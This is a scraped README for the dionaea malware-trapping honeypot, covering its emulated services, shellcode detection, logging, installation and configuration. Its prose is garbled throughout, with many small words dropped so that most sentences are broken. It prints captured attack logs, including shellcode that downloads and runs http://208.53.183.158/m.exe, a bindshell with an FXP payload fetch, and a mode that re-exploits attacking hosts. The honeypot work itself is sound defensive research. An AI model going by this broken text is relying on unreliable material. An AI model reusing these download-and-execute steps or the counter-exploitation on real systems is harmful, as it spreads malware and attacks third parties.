{
	"_id": "14416319",
	"site": "https://github.com/gento/dionaea",
	"title": "Gento/dionaea: honeypot featuring wannacry",
	"author": "Daviey",
	"date": "2017-06-13T13:56:32.002Z",
	"tags": {
		"categories": [
			"opensource"
		],
		"languages": [
			"python",
			"c",
			"m4",
			"other"
		]
	},
	"content": "readme dionaea catches bugsdionaea is meant be nepenthes successor, embedding python scripting language, using libemu detect shellcodes, supporting ipv6 tls * development <#development> * compiling & installation <#compiling> * update <#update> * running <#running> * configuration <#configuration> * honors <#honorem> * links <#links> * faq <#faq> * segfault <#segfault> * support <#support> * blog <http://carnivore.>------------------------------------------------------------------------ how worksdionaea intention is trap malware exploiting vulnerabilities exposed services offerd a network, ultimate goal is gaining copy the malware. security software is likely have bugs, bugs software offering networkservices be exploitable, dionaea is software offering networkservices, is likely dionaea has exploitable bugs. course try avoid , but nobody fail trying hard, would need software such dionaea., in order minimize impact, dionaea drop privileges, chroot. be able run certain actions require privileges, dionaea dropped , dionaea creates child process startup, asks child process run actions require elevated privileges. does guarantee anything, it should harder get gainroot access the system an unprivileged user a chrootenvironment. network connectivitygiven softwares intented , network io is crucial. network iois within main process a called non-blocking manner. understand nonblocking, imagine have many pipes infront you, these pipes send something, you put something thepipe. you to put something a pipe, while is crowded,'d to wait, you to something a pipe, thereis nothing, 'd to wait too. doing pipe game non-blockingmeans won't wait the pipes be write/readable, 'll something off pipes once data arrives, write once pipe is crowded. you to write large chunk the pipe, thepipe is crowded a small piece, note rest the chunk wanted write, wait the pipe get ready.dns resolves are done using libudns, is neat non-blocking dnsresolving library support aaaa records chained cnames. much non-blocking.dionaea uses libev get notified once can act a socket, read write.dionaea offer services via tcp/udp tls ipv4 ipv6, can apply rate limiting accounting limits per connections tcp tls connections - required. protocolsnetwork services speak certain language, language is called protocol. we started deploying honeypots, could trap worms byopening single port, wait them connect send an urlwhere could download copy the worm. service gettingattacked was backdoor the bagle mailworm, it did require interaction.later , the exploitations real services got more complex, youhad reply something the worm fool .nowadays worms api access services, before sending payload. allow easy adjustments the procotol, dionaea implements protocols python. is glue between network layer isdone the c programming language the embedded python scriptinglanguage, allows using non-blocking connections python. has benefits, example can non-blocking tlsconnections python, we get rate limiting them (required), where pythons own io does offer such things. the hand, is much more comfortable implement protocols python doing same c. smb main protocol offerd dionaea is smb. smb has decent history remote exploitable bugs, is very popular target worms.dionaeas smb implementation makes of python3 adapted version scapy. scapys own version smb was pretty limited, almosteverything the field declarations had be rewritten. smbemulation written dionaea is used the mwcollectd<http://code.mwcollect.org> low interaction honeypot too.besides known attacks smb dionaea supports uploading files smbshares.adding dce remote procedure calls is good start get dionaea code, can :select count(*), dcerpcrequests.dcerpcrequest_uuid, dcerpcservice_name, dcerpcrequest_opnum dcerpcrequests join dcerpcservices (dcerpcrequests.dcerpcrequest_uuid == dcerpcservices.dcerpcservice_uuid) left outer join dcerpcserviceops (dcerpcserviceops.dcerpcserviceop_opnum = dcerpcrequest_opnum dcerpcservices.dcerpcservice = dcerpcserviceops.dcerpcservice ) where dcerpcserviceop_name is nullgroup dcerpcrequests.dcerpcrequest_uuid,dcerpcservice_name,dcerpcrequest_opnumorder count(*) desc; identify potential usefull targets unknown dcerpc calls using data gathered stored your logsql database. patches areappreciated. httpdionaea supports http port 80 well https, there is codemaking of data gathered these ports. https, self-signed ssl certificate is created startup. ftpdionaea provives basic ftp server port 21, can createdirectories upload download files. my own experience are very little automated attacks ftp services i'm yet seesomething interesting happening port 21. tftpwritten test udp connection code, dionaea provides tftp server port 69, can serve files. though werevulnerabilities tftp services, 'm yet see automated attack tftp services. mssql module implements tabular data stream protocol is used microsoft sql server. listens tcp/1433 allows clients login. can decode queries run the database, as is database, dionaea 't reply, there is further action. typically always the same query:exec sp_server_info 1 exec sp_server_info 2 exec sp_server_info 500 select 501,null,1 where ''='a' select 504,c.name,c.description,c.definition master.dbo.syscharsets c,master.dbo.syscharsets c1,master.dbo.sysconfigures f where f.config=123 f.value=c1.id c1.csid=c.id set textsize 2147483647 set arithabort refer the blog<http://carnivore./2010/09/11/mssql_attacks_examined> moreinformation.patches be appreciated. mysql module implements mysql wire stream protocol - backed bysqlite database. please refer 2011-05-15 extending dionaea<http://carnivore./2011/05/15/extending_dionaea> more information. sip (voip) is voip module the honeypot dionaea. voip protocol usedis sip since is de facto standard voip today. contrast some voip honeypots, module doesn't connect an externalvoip registrar/server. simply waits incoming sip messages (e.g.options even invite), logs data honeypot incidents /orbinary data dumps (rtp traffic), reacts accordingly, instance creating sip session including rtp audio channel. sophisticatedexploits within sip payload are very common yet, honeypotmodule doesn't pass code dionaea's code emulation engine. will implemented we spot such malicious messages. mainfeatures the voip module are: * support most sip requests (options, invite, ack, cancel, bye) * support multiple sip sessions rtp audio streams * record rtp data (optional) * set custom sip username secret (password) * set custom useragent mimic different phone models * uses dionaea's incident system log sql database personalities personality defines to handle request. least 'default'personality must exist. following options are available perpersonality.serve list ip addresses use personality . handle list sip methods handle. sip users can easily add, change remove users editing sqlite filespecified the 'users = \"\"' parameter the config file. usersare specified the users table.username specifies name the user. value is treated regular expression. python: regular expressions <http://docs.python.org/py3k/library/re.html> more information. password password. personality user is available the personality specified this value. can define personality the config file. pickup_delay_min is integer value. let phone ring at least number seconds. pickup_delay_max is integer value. maximum number seconds wait before dionaea picks the phone. action value isn't use, yet. sdp name the sdp use. table 'sdp'. sdp sdps be defined the sdp table the users database.name name the sdpsdp value use sdp following values are available the sdp definition.{addrtype} address type. (ip4 ip6) {unicast_address} rtp address {audio_port} dionaea audio port. {video_port} dionaea video port. following control parameters are available the sdp definition.[audio_port]...content...[/audio_port] content is available the output the audio_port value is set. [video_port]...content...[/video_port] content is available the output the video_port value is set. example:v=0o=- 1304279835 1 {addrtype} {unicast_address}s=sip sessionc= {addrtype} {unicast_address}t=0 0[audio_port]m=audio {audio_port} rtp/avp 111 0 8 9 101 120=sendrecv=rtpmap:111 speex/16000/1=fmtp:111 sr=16000,mode=a=rtpmap:0 pcmu/8000/1=rtpmap:8 pcma/8000/1=rtpmap:9 g722/8000/1=rtpmap:101 telephone-event/8000=fmtp:101 0-16,32,36=rtpmap:120 nse/8000=fmtp:120 192-193[/audio_port][video_port]m=video {video_port} rtp/avp 34 96 97c= {addrtype} {unicast_address}=rtpmap:34 h263/90000=fmtp:34 qcif=2=rtpmap:96 h263-1998/90000=fmtp:96 qcif=2=rtpmap:97 h263-n800/90000[/video_port] exploitationattackers not seek service, attackers to exploit ,they'll chat the service some packets, afterwards sent payload. dionaea has detect evaluate payload be able gain copy the malware. order do , dionaea uses libemu.given certain circumstances, libemu detect shellcode, measure shellcode, if required execute shellcode. shellcodedetection is done making of getpc heuristics, others wrote papers it, decided write libemu do . this detection is rather consuming, therefore done using threads. part dionaea takes care the network io create copy all /output run a connection, copy is passed thedetection facility, is tree detection facilities, thismoment is a single leaf, emu plugin. emu plugin usesthreads libemu detect profile/measure shellcode.shellcode measurement/profiling is done running shellcode thelibemu vm recording api calls arguments. most shellcodeprofiling is sufficient, recorded api calls arguments revealenough information get idea the attackers intention actupon . for multi-stage shellcode, where first exploitation stage the shellcode retrieve second shellcode the attacker,profiling is sufficient, we lack information ' to 'from second stage the shellcode, this case need make of shellcode execution. shellcode execution is basically same shellcode profiling, only difference is recording api calls, we allow shellcode take certain actions, example creating network connection. payloadsonce have payload, the profile, dionaea has guess intention, act upon shells - bind/connectback payload offers shell (cmd.exe prompt) the attacker, either binding port waiting the attacker connect us again, by connection the attacker. both cases, dionaea offers cmd.exeemulation the attacker, parses input, acts upon input,usually instructions download file via ftp tftp. urldownloadtofile shellcodes the urldownloadtofile api call retrieve filevia http, execute retrieved file afterwards execmaking of winexec, shellcode execute single command has be parsed processed the bind/connectback shellshellcommands. multi stage payloads never what second stage is, therefore libemu is used execute shellcode the libemu vm. downloadsonce dionaea gained location the file attacker wants todownloads the shellcode, dionaea try download file. protocol downloads files via tftp ftp is implemented python(ftp.py tftp.py) part dionaea, downloading files via http isdone the curl module - makes of libcurl's awsome httpcapabilities. course libcurl run downloads ftp too, theftp services embedded malware designed work windows ftp.execlient, fail others. submitonce dionaea got copy the worm attacking , we may to store file locally further analysis, submit file some 3rdparty further analysis.dionaea http/post file several services cwsandbox,norman sandbox virustotal. logginggetting copy the malware is cool, getting overview theattacks run your sensor is priceless.dionaea write information a text file, be aware, dionaeaslogging text files is rather chatty, really chatty, you not to at information, you are debugging software writing new feature it. course, can appy filters the logging, limit to differentfacilities levels, in general do want work textfiles.dionaea uses internal communication system is calledincidents. incident has origin, is string, path, properties, can integers, strings, a pointer aconnection. incidents limit the max, pass informationrequired incident handlers (ihandler). ihandler register path incidents wants get informed , the pathes arematched a glob fashion. therefore logging information using ihandler is superior text logging, get information arelooking , and write to format choose yourself. is the logsql python script does, is ihandler, writesinteresting incidents a sqlite database, of benefits thislogging is ability cluster incidents based the initial attack retrieving data the database:connection 610 smbd tcp accept 10.69.53.52:445 <- 10.65.34.231:2010 dcerpc request: uuid '3919286a-b10c-11d0-9ba8-00c04fd92ef5' opnum 9 p0f: genre:'windows' detail:'xp sp1+, 2000 sp3' uptime:'-1' tos:'' dist:'11' nat:'0' fw:'0' profile: [{'return': '0x7c802367', 'args': ['', 'createprocessa'], 'call': 'getprocaddress'}, ...., {'return': '0', 'args': ['0'], 'call': 'exitthread'}] service: bindshell://1957 connection 611 remoteshell tcp listen 10.69.53.52:1957 connection 612 remoteshell tcp accept 10.69.53.52:1957 <- 10.65.34.231:2135 p0f: genre:'windows' detail:'xp sp1+, 2000 sp3' uptime:'-1' tos:'' dist:'11' nat:'0' fw:'0' offer: fxp://1:1@10.65.34.231:8218/ssms.exe download: 1d419d615dbe5a238bbaa569b3829a23 fxp://1:1@10.65.34.231:8218/ssms.exe connection 613 ftpctrl tcp connect 10.69.53.52:37065 -> 10.65.34.231/none:8218 connection 614 ftpdata tcp listen 10.69.53.52:62087 connection 615 ftpdata tcp accept 10.69.53.52:62087 <- 10.65.34.231:2308 p0f: genre:'windows' detail:'xp sp1+, 2000 sp3' uptime:'-1' tos:'' dist:'11' nat:'0' fw:'0'additionally, can query database many different things,refer : * dionaea sql logging 2009/11/06 <http://carnivore./2009/11/06/dionaea_sql_logging> * post yourself 2009/12/08 <http://carnivore./2009/12/08/post_it_yourself> * sqlite performance 2009/12/12 <http://carnivore./2009/12/12/sqlite_performance> * virustotal fun 2009/12/14 <http://carnivore./2009/12/14/virustotal_fun> * andrew waite's blog <http://infosanity.wordpress.com/> mimic-nepstats.py more examples to use the database.additional local logging, dionaea send contionous stream itsattacks a xmpp server, allows creating distributed setup sensors high detail information each attack.refer logxmpp <#logxmpp> pg_backend <#pg_backend> moreinformation distributed setups using xmpp.------------------------------------------------------------------------ developmentdionaea initial development was funded the honeynet project<http://honeynet.org/> part the honeynets summer code during2009. development process is open possible; can browse<http://src.carnivore./dionaea> source online subscribe rssupdates <http://src.carnivore./dionaea/atom> submit bugs patches <mailto:nepenthes-devel@lists.sourceforge.net>. compiling & installation requirements * libev <#install_libev> >=4.04, schmorp.de <http://software.schmorp.de/pkg/libev.html> * libglib <#install_glib> >=2.20 * libssl <#install_openssl>, openssl.org <http://www.openssl.org> * liblcfg <#install_liblcfg>, liblcfg.carnivore. <http://liblcfg.carnivore.> * libemu <#install_libemu>, libemu.carnivore. <http://libemu.carnivore.> * python <#install_python> >=3.2, python.org <http://www.python.org> * o sqlite <#install_sqlite> >=3.3.6 sqlite.org <http://www.sqlite.org> o readline <#install_readline> >=3 cnswww.cns.cwru.edu <http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html> * cython <#install_cython> >0.14.1, cython.org <http://www.cython.org> * libudns <#install_udns>, corpit.ru <http://www.corpit.ru/mjt/udns.html> * libcurl <#install_curl> >=7.18, curl.haxx.se <http://curl.haxx.se> * libpcap <#install_pcap> >=1.1.1, tcpdump.org <http://www.tcpdump.org> * libnl <#install_nl> git, infradead.org <http://www.infradead.org/~tgr/libnl/> (optional) * libgc >=6.8, hp.com <http://linux.maruhn.com/sec/libgc.html> (optional) ubuntu packages are provided the apt-tree, you don't to installeverything sourceaptitude install libudns-dev libglib2.0-dev libssl-dev libcurl4-openssl-dev \\libreadline-dev libsqlite3-dev python-dev \\libtool automake autoconf build-essential \\subversion git-core \\flex bison \\pkg-config tar xfz ... remaining dependencies to installed source, willinstall dependencies /opt/dionaea here, make sure directory exists, you are allowed write . libglib (debian <= etch) your lack recent glib, better update operating system. liblcfg ()git clone git://git.carnivore./liblcfg.git liblcfgcd liblcfg/codeautoreconf -vi./configure --prefix=/opt/dionaea installcd ..cd .. libemu ()git clone git://git.carnivore./libemu.git libemucd libemuautoreconf -vi./configure --prefix=/opt/dionaea installcd .. libnl (linux && optional) case use ubuntu, libnl3 may available apt,apt- install libnl-3-dev libnl-genl-3-dev libnl-nf-3-dev libnl-route-3-dev else install from git.git clone git://git.infradead.org/users/tgr/libnl.gitcd libnlautoreconf -viexport ldflags=-wl,-rpath,/opt/dionaea/lib./configure --prefix=/opt/dionaeamake installcd .. libev ()wget http://dist.schmorp.de/libev/attic/libev-4.04.tar.gztar xfz libev-4.04.tar.gzcd libev-4.04./configure --prefix=/opt/dionaea installcd .. python 3.2before installing python, will install required dependencies readlineshould available every distribution. sqlite > 3.3should available every distribution. your distributions sqliteversion is < 3.3 does support triggers, are doomed, pleaselet know, 'll write how broken pythons build scripts are, document to compile with user- provided - more recent -sqlite version. pythonwget http://www.python.org/ftp/python/3.2.2/python-3.2.2.tgztar xfz python-3.2.2.tgzcd python-3.2.2/./configure --enable-shared --prefix=/opt/dionaea ---computed-gotos \\ --enable-ipv6 ldflags=\"-wl,-rpath=/opt/dionaea/lib/ -l/usr/lib/x86_64-linux-gnu/\"make install cython ()we to cython >= 0.15 previous releases not supportpython3.2 __hash__'s py_hash_type x86.wget http://cython.org/release/cython-0.15.tar.gztar xfz cython-0.15.tar.gzcd cython-0.15/opt/dionaea/bin/python3 setup.py installcd .. udns (!ubuntu)udns does use autotools build.wget http://www.corpit.ru/mjt/udns/old/udns_0.0.9.tar.gztar xfz udns_0.0.9.tar.gzcd udns-0.0.9/./configure shared is make install, we copy header our include directory. cp udns.h /opt/dionaea/include/ the lib our library directory. cp *.* /opt/dionaea/lib/cd /opt/dionaea/libln -s libudns..0 libudns.cd -cd .. libcurl ()grabbing curl your distributions maintainer should , if run decent distribution. not consider upgrading operating system. libpcap ()to honor effort, rely libpcap 1.1.1. distros ship olderversions, therefore is likely have install from source.wget http://www.tcpdump.org/release/libpcap-1.1.1.tar.gztar xfz libpcap-1.1.1.tar.gzcd libpcap-1.1.1./configure --prefix=/opt/dionaeamake installcd .. openssl (optional)*warning:* doing , requires ** dependencies be compiled using same ssl version, you to link curl python your ownopenssl build too you experience problems tls connections, install openssl >=0.9.8l/1.0.0-beta2, fall to cvs now.cvs -d anonymous@cvs.openssl.org:/openssl-cvs co opensslcd openssl./configure shared --prefix=/opt/dionaea linux-x86_64 shared_ldflags=-wl,-rpath,/opt/dionaea/lib install compiling dionaeagit clone git://git.carnivore./dionaea.git dionaea ..cd dionaeaautoreconf -vi./configure ---lcfg-include=/opt/dionaea/include/ \\ ---lcfg-lib=/opt/dionaea/lib/ \\ ---python=/opt/dionaea/bin/python3.2 \\ ---cython-dir=/opt/dionaea/bin \\ ---udns-include=/opt/dionaea/include/ \\ ---udns-lib=/opt/dionaea/lib/ \\ ---emu-include=/opt/dionaea/include/ \\ ---emu-lib=/opt/dionaea/lib/ \\ ---gc-include=/usr/include/gc \\ ---ev-include=/opt/dionaea/include \\ ---ev-lib=/opt/dionaea/lib \\ ---nl-include=/opt/dionaea/include \\ ---nl-lib=/opt/dionaea/lib/ \\ ---curl-config=/usr/bin/ \\ ---pcap-include=/opt/dionaea/include \\ ---pcap-lib=/opt/dionaea/lib/ make install update dionaea updates boil down agit pull; clean install, you always to sure config file is to date, can /opt/dionaea/etc/dionaea# diff dionaea.conf dionaea.conf.dist packages packages below are 3rd party provided, is appreciated. you compiled package your own distribution, send the link. * ubuntu lucid <https://launchpad.net/~honeynet> - weekly git snapshots * debian <http://carnivore./2010/05/18/debianization> - really packages, a guide to create packages * arch linux <http://aur.archlinux.org/packages.php?id=36944> - build scripts, compile source, uses git * slackware <http://maimed.org/~pyllyukko/stuff.shtml> - build scripts, compile source, uses git running dionaea software has flags can provide startup, -h flagsshows help, -h includes default values. -c, --config=file file configuration file default value/behaviour: /opt/dionaea/etc/dionaea.conf -d, --daemonize run daemon -g, --group=group switch group startup ( with -u) default value/behaviour: keep current group -g, --garbage=[collect|debug] garbage collect, usefull debug memory leaks, does work valgrind -h, --help display help -h, --large-help display help default values -l, --log-levels= which levels log, valid values , debug, info, message, warning, critical, error combine using ',', exclude - prefix -l, --log-domains= which domains * and ? wildcards, combine using ',', exclude using - -u, --user=user switch user startup default value/behaviour: keep current user -p, --pid-file=file write pid file -r, --chroot=dir chroot dir startup default value/behaviour: don't chroot -v, --version show version -w, --workingdir=dir set process' working dir dir default value/behaviour: /opt/dionaeaexamples:# dionaea -l ,-debug -l '*'# dionaea -l ,-debug -l 'con*,py*'# dionaea -u nobody -g nogroup -r /opt/dionaea/ -w /opt/dionaea -p /opt/dionaea/var/dionaea.pid configuration - dionaea.conf you to change software, is really important understand it works, therefore please the to it works.dionaea.conf is main configuration file, file controls consists sections : * logging * processors * downloads * bistreams * submit * listen * modules logging logging section controls ... logging, can specify log domains loglevel different logfiles. dionaea is pretty ... verbose, is useful rotate logfilesusing logrotate.# logrotate requires dionaea be started a pidfile# this case -p /opt/dionaea/var/run/dionaea.pid# adjust path your needs/opt/dionaea/var/log/dionaea*.log { notifempty missingok rotate 28 daily delaycompress compress create 660 root root dateext postrotate kill -hup `cat /opt/dionaea/var/run/dionaea.pid` endscript}//etc/logrotate.d/dionaea/processors control actions done the bi-directional streams gain getting attacked, default is running emu processor them detect shellcode.downloads specify where store downloaded malware.bistreams specify where store bi-directional streams, arepretty useful debugging, they allow replay attack ip-level, without messing pcap&tcpreplay, never worked me.submit specifies where send files via http ftp, can define new section within submit you to add own service.listen sets addresses dionaea listen . the default is **addresses can find, mode is call getifaddrs, you set to manual specify single address you to limit .modules is most powerfull section, it specifies modules load, the options each module. subsections name is name the module dionaea try load, modules got rather simplistic names, pcap module uselibpcap, curl module libcurl, emu module libemu ... python module is special, the python module load pythonscripts, offer services, each services have own options. modules pcap pcap module uses libpcap library detect rejected connectionattempts, even we not accept connection, can theinformation somebody wanted connect . curl curl module is used transfer files and servers, isused download files via http well submitting files 3rd parties emu emu module is used detect, profile - if required - executeshellcode. python python module allows using python interpreter dionaea, allows controlling scripts dionaea uses logsql <#logsql> section controls logging the sqlite database.logsql does work chrooting - python makes path absolute fails requests chroot().logsql requires directory where logsql.sqlite file resides bewriteable the user, well the logsql.sqlite file itself., if drop user privs, sure user drop is allowed read/write file the directory.chown myuser:mygroup /opt/dionaea/var/dionaea -r query logsql database, recommend looking thereadlogsqltree.py <#readlogsqltree> script, visualisation gnuplotsql <#gnuplotsql> script. blog logsql: * 2009-11-06 dionaea sql logging <http://carnivore./2009/11/06/dionaea_sql_logging> * 2009-12-08 post yourself <http://carnivore./2009/12/08/post_it_yourself> * 2009-12-12 sqlite performance <http://carnivore./2009/12/12/sqlite_performance> * 2009-12-14 virustotal fun <http://carnivore./2009/12/14/virustotal_fun> * 2009-12-15 paris mission pack avs <http://carnivore./2009/12/15/paris_mission_pack_avs> * 2010-06-06 data visualisation <http://carnivore./2010/06/06/data_visualisation> logxmpp <#logxmpp> section controls logging xmpp services. you to logxmpp, sure enable logxmpp the ihandler section.using logxmpp allows to share new collected files othersensors anonymously. blog logxmpp: * 2010-02-10 xmpp backend <http://carnivore./2010/02/10/xmpp_backend> * 2010-05-12 xmpp #2 <http://carnivore./2010/05/12/xmpp_-_take_2> * 2010-05-15 xmpp #3 <http://carnivore./2010/05/15/xmpp_-_take_3>pg_backend <#pg_backend> be used a backend xmpp logging sensors. p0f enabled default, recommend: p0f service, enable uncommenting p0f the ihandlers section the python modules section, start p0f suggested the config. costs nothing, gives pretty cool, if outdated, informations the attackersoperating system, you look up the sqlite database, the rejected connections. you face problems, here<http://blog.infosanity.co.uk/2010/12/04/dionaea--p0f/> are hints. nfq <#nfq_python> python nfq script is counterpart the nfq module. while nfq module interacts the kernel, nfq python script takes care the required steps start new service the ports.nfq intercept incoming tcp connections during tcp handshakegiving honeypot possibility provide service ports are served default. dionaea not predict protocol be spoken unknownports, neither implement protocol itself, will connect attacking host the same port, use attackers server sideprotocol implementation reply the client requests the attackertherefore dionaea end re?exploiting attackers machine, by sending the exploit sent .the technique is brainchild tillmann werner, used within honeytrap <http://honeytrap.carnivore.> honeypot.legal boundaries such behaviour may different each country, well ethical boundaries each individual. a technical point view works, gives results.learning the best, decided adopt technique dionaea.besides legal ethical issues this approach, are technical things have be mentioned * */port scanning/* your honeypot gets port scanned, would open service each port scanned, worst case 'd end with offering 64k services per ip scanned. default 'd run of fds about 870 services offerd, experience weird behaviour. therefore impact port scanning has be limited. kiss approach taken here is sliding window *throttle.window* seconds size. each slot this sliding window represents second, we increment slot each connection accept. before accept connection, check the sum all slots is below *throttle.limits.total*, else do create new service. the sum is below limit, check the current slot is below slot limit too, both are given, create new service. one the condition fails, do spawn new service, let nfqeueu process packet. are ways process packets got throttled: o *nf_accept* (=1), will let packet pass kernel, as is service listening, packet gets rejected. o *nf_drop* (=0), will drop packet the kernel, remote does get answer his syn. prefer nf_drop, port scanners such nmap tend limit scanning speed, once notice packets lost. * */recursive-self-connecting/* assume shellcode download instructions makes dionaea o connect itself a unbound port o nfq intercepts attempt o spawns service o accepts connection #1 o creates mirror connection connection #1 connecting remotehost (itself) the same port #2 o accepts connection #2 connection #3 o creates mirror connection connection #3 connecting remotehost (itself) the same port #4 o .... o .... such recursive loop, has be avoided obvious reasons. therefore dionaea checks the remote host connecting nfq mirror is local address using 'getifaddrs' drops local connections. much the known problems workarounds ... you read far, want use despite technical/legal/ethical problems. ... you'll need iptables, you'll to tell iptables enqueuepackets would establish new connection. recommend something this:iptables -t mangle - prerouting - eth0 -p tcp -m socket -j acceptiptables -t mangle - prerouting - eth0 -p tcp --syn -m state --state -j nfqueue --queue-num 5explanation: 1. accept connections existing services 2. enqueue other packets the nfqueue you dionaea running your nat router, recommend something :iptables -t mangle - prerouting - ppp0 -p tcp -m socket -j acceptiptables -t mangle - prerouting - ppp0 -p tcp --syn -m state --state -j mark --set-mark 0x1iptables - input - ppp0 -m mark --mark 0x1 -j nfqueueexplanation: 1. accept connections existing services mangle::prerouting 2. mark other packets 3. we these marked packets input, queue using something :iptables - input -p tcp --tcp-flags syn,rst,ack,fin syn -j nfqueue --queue-num 5 enqueue // syn packets the nfqueue, once stop dionaea will even able connect your ssh daemon. if add exemption ssh :iptables - input - eth0 -p tcp --syn -m state --state --destination-port ! 22 -j nfqueuedionaea try create new service /every/ incomingconnection, if is service running already. it is easy avoid , i recommend sticking the recommendation.besides already mention throttle settings, are varioustimeouts the nfq mirror service the config. can control long service wait new connections(/timeouts.server.listen/), how long mirror connection beidle (/timeouts.client.idle/) sustain (/timeouts.client.sustain/). ihandlersihandlers section is used specify ihandlers started ihandlers.py . do want miss p0f logsql. servicesservices controls services get started services.py utilsdionaea ships some utils, these utils are written python rely the python3 interpreter dionaea requires operate, software be found modules/python/utils. readlogsqltree <#readlogsqltree> - modules/python/readlogsqltree.pyreadlogsqltree is python3 script queries logsql sqlitedatabase attacks, prints all related information everyattack. is example an attack, get vulnerability exploited, time, attacker, information the shellcode, fileoffered download, even virustotal report the file.2010-10-07 20:37:27 connection 483256 smbd tcp accept 10.0.1.11:445 <- 93.177.176.190:47650 (483256 none) dcerpc bind: uuid '4b324fc8-1670-01d3-1278-5a47bf6ee188' (srvsvc) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid '7d705026-884d-af82-7b3d-961deaeb179a' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid '7f4fdfe9-2be7-4d6b-a5d4-aa3c831503a1' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid '8b52c8fd-cc85-3a74-8b15-29e030cdac16' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid '9acbde5b-25e1-7283-1f10-a3a292e73676' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid '9f7e2197-9e40-bec9-d7eb-a4b0f137fe95' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid 'a71e0ebe-6154-e021-9104-5ae423e682d0' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid 'b3332384-081f-0e95-2c4a-302cc3080783' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid 'c0cdf474-2d09-f37f-beb8-73350c065268' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid 'd89a50ad-b919-f35c-1c99-4153ad1e6075' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc bind: uuid 'ea256ce5-8ae1-c21b-4a17-568829eec306' (none) transfersyntax 8a885d04-1ceb-11c9-9fe8-08002b104860 dcerpc request: uuid '4b324fc8-1670-01d3-1278-5a47bf6ee188' (srvsvc) opnum 31 (netpathcanonicalize (ms08-67)) profile: [{'return': '0x7df20000', 'args': ['urlmon'], 'call': 'loadlibrarya'}, {'return': '0', 'args': ['', 'http://208.53.183.158/m.exe', '60.exe', '0', '0'], 'call': 'urldownloadtofile'}, {'return': '32', 'args': ['60.exe', '895'], 'call': 'winexec'}, {'return': '0', 'args': ['-1'], 'call': 'sleep'}] offer: http://208.53.183.158/m.exe download: 3eab379ddac7d80d3e38399fd273ddd4 http://208.53.183.158/m.exe virustotal 2010-10-07 04:59:07 5/38 (13%) http://www.virustotal.com/file-scan/report.html?id=265e39edcba9d9004451601544e625f2d3d04f837d0aaf1f8464cb2c819c1939-1286420347 names 'high risk fraudulent security program' 'suspicious file' 'trojan.downloader1.27100' 'worm.win32.rimecud' 'worm:win32/rimecud.b' create such report your own honeypots activities the last 24hours run:./readlogsqltree.py -t $(date '+%s')-24*3600 /opt/dionaea/var/dionaea/logsql.sqlite gnuplotsql <#gnuplotsql> - modules/python/gnuplotsql.pygnuplotsql is very slow python3 script runs queries thelogsql <#logsql> sqlite database creates graphs gnuplot thedata, stores on disk creates index the data. imagesare per protocol look this: overview dionaea smbd.here <gnuplotsql> is the whole thing looks .to create such images your own data, run:./gnuplotsql.py -d /opt/dionaea/var/dionaea/logsql.sqlite -p smbd -p epmapper -p mssqld -p httpd -p ftpd blog got something gnuplotsql well: * 2010-12-05 sudden death <http://carnivore./2010/12/05/sudden_death> * 2010-10-01 infosanity's blog: gnuplotsql.py <http://blog.infosanity.co.uk/2010/10/01/gnuplotsql-py/> * 2010-09-19 gnuplotsql <http://carnivore./2010/09/19/gnuplotsql> pg_backend <#pg_backend> - modules/python/xmpp/pg_backend.pypg_backend is backend logxmpp <#logxmpp>, currently is python2.x script uses pyxmpp access xmpp service. parses messages received can store events a postgres database the received files disk. pg_backend requires xmpp account./without db/./pg_backend.py -u user@sensors.carnivore. -p xmpppass -m dionaea.sensors.carnivore. -c anon-files -c anon-events -f /tmp// db/ create databasepsql ...start backend./pg_backend.py -u user@sensors.carnivore. -p xmpppass -m dionaea.sensors.carnivore. -c anon-files -c anon-events -s dbhost -u dbuser -d xmpp -p dbpass -f /tmp/ faq <#faq> get gcc: command found? install gcc.. to uninstall ? rm -rf /opt/dionaea get binding.pyx:...: undeclared name builtin: bytes during python modules build install recent cython version get python.h found during compiling cython install appropriate headers your python interpreter get operationalerror unable open database file usinglogsqlite it does work all read logsql instructions <#logsql> get segmentation fault read segfault instructions <#segfault> logrotate, after logrotate dionaea does log anymore. read logrotate instructions <#logging> do use ubuntu/debian the instructions are useless metherefore. use debian/ubuntu, therefore can provide instructions debian/ubuntu, you are free send a diff your operating systemp0f does work. sure have p0f 2.0.8 dionaea does listen ::, p0f 't deal ipv6.'m facing bug, fails, i 't figure why . explain problem, i'm interested the nature the problem, it does sound pebcak, may ask a shell/screen have look myself, if is worth , you'll get faq entry some specialties your os. use redhat/centos 5 the installation is frustrating a mess nothing works. thats right, i did choose operating system. here is list outdated missing packages your choosen distribution: **. yes, 'll have install glib ('ll 2.10 where 2.20 is required) source. getting python3 compiled a recent sqlite3 version installed /opt/dionaea requires editing setup.py file (patch <http://p.carnivore./kdifwt>). / experienced wonderful operating system myself ... really to love distro stick it, if ships software versions grandma saw released her youth. *centos is best distro ... change distros*. matter you choose, can't worse./ tips tricksdionaea embedds python interpreter, can offer python clitherefore too.* python cli is blocking*, you start entering command, wholeprocess wait you finish , and accept new connections. can the python cli interact dionaea, is veryuseful development debugging. configuration can access dionaea.conf via python (readonly) dionaea import g_dionaeag_dionaea.config() completition history the cli you the cli often, can it behave a real shell,including history completition.import rlcompleter, readlinereadline.parse_and_bind('tab: complete') triggering downloadssometimes helps trigger download, without waiting an attack.very useful you to verify permissions are correct switching user, making sure submission a 3rd party works correctly. can trigger downloads all major protocols. ftp dionaea.ftp import ftpf = ftp()f.download(none, 'anonymous','guest','ftp.kernel.org',21, 'welcome.msg', 'binary','ftp://ftp.kernel.org/welcome.msg') tftp dionaea.tftp import tftpclientt = tftpclient()t.download(none, 'tftp.example.com', 69, 'filename') http the http download is done python, do use downloadfacility directly, create incident, will trigger download dionaea.core import incident = incident(\"dionaea.download.offer\").set(\"url\", \"http://www.honeynet.org\").report() incidentsincidents are ipc used dionaea. 